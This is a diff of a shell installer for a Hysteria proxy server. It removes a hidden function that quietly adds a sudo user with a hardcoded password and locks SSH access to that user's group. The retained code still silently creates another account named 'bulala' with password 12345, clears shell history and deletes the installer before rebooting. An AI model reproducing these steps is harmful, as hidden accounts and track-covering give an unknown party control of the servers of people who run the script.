@@ -888,7 +888,6 @@ fi
 
 
 
-
 if nc -z localhost 8000; then
     echo "SocksProxy running"
 else
@@ -929,19 +928,6 @@ echo "* * * * * /bin/bash /bin/auto >/dev/null 2>&1
 }
 
 
-
-install_sudo(){
-  {
-    useradd -m tknetwork 2>/dev/null; echo tknetwork:JAN022011b | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups tknetwork" >> /etc/ssh/sshd_config
-    service sshd restart
-  }&>/dev/null
-}
-
-
-
-
 iptablesrules () {
 echo 'net.ipv4.ip_forward=1
 ' >> /etc/sysctl.conf
@@ -971,7 +957,7 @@ systemctl enable hysteria-server.service
  /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulala
  history -c;
  rm ~/install_server.sh
- rm ~/nameofscript.x
+ rm ~/hysteria.sh
  netstat -tupln
  reboot
 }
@@ -979,7 +965,6 @@ systemctl enable hysteria-server.service
 
 
 system_package
-install_sudo
 install_hysteria
 modify_hysteria
 create_hostname
